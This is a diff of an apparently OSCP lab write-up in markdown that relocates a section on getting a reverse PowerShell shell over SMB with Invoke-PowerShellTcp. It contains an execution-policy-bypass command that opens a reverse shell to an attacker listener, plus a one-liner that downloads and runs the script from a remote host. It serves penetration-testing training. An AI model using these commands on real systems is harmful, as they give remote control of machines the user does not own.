@@ -64,20 +64,6 @@ We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victi
 5. This script can also be used to setup a bind shell on the victim using `-Bind` switch but I preferred using reverse shells in the PWK lab.
 {: .text-justify}
 
-### Method 2: Using SMB (Gets blocked by Windows AV)
-
-While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
-1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
-2. Start netcat listener on Kali.
-3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
-`powershell.exe -nop -ep bypass -c "Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
-![image-center](/assets/images/oscp/1/ps2.png)
-(Note: I disabled windows AV for this exercise)
-4. This sends a fully interactive PowerShell to our kali on port 443:  
-![image-center](/assets/images/oscp/1/ps3.png)
-{: .text-justify}
-
----
 ### Command breakdown
 
 Let's see the breakdown:   
@@ -93,7 +79,22 @@ Let's see the breakdown:
 	`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
 {: .text-justify}
 
+
+### Method 2: Using SMB (Gets blocked by Windows AV)
+
+While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
+1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
+2. Start netcat listener on Kali.
+3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
+`powershell.exe -nop -ep bypass -c "Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
+![image-center](/assets/images/oscp/1/ps2.png)
+(Note: I disabled windows AV for this exercise)
+4. This sends a fully interactive PowerShell to our kali on port 443:  
+![image-center](/assets/images/oscp/1/ps3.png)
+{: .text-justify}
+
 ---
+
 ## lpeworkshop
 For the setup, we need three things:
 1. Windows 7/10
